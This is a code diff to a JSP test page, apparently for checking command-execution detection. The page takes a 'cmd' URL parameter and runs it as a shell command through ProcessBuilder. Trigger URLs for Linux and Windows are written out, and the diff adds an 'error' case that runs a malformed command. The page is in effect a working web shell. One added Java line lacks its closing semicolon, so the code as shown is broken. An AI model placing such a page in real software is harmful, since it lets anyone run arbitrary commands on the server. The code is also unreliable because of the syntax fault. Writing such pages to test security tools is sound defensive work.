@@ -12,10 +12,14 @@
 <%
 String linux_querystring = "?cmd=ls+-la+/";
 String windows_querystring = "?cmd=cmd+/c+dir";
+String error_querystring = "?cmd=error";
 String output = "";
 String cmd    = request.getParameter ("cmd");
 if (cmd != null)
 {
+    if (cmd.equals("error")) {
+        cmd = "echo 'test' xxxx'"
+    }
     try {
         ProcessBuilder builder;
         if (File.separator.startsWith ("\\"))
@@ -47,6 +51,9 @@ if (cmd != null)
     <br>
     <p>Windows 触发: </p>
     <p>curl '<a href="<%=request.getRequestURL()+windows_querystring%>" target="_blank"><%=request.getRequestURL()+windows_querystring%></a>'</p>
+    <br>
+    <p>语法错误检测: (执行命令: echo 'test' xxxx' )</p>
+    <p>curl '<a href="<%=request.getRequestURL()+error_querystring%>" target="_blank"><%=request.getRequestURL()+error_querystring%></a>'</p>
 <pre>
 <%=output %>
 </pre>
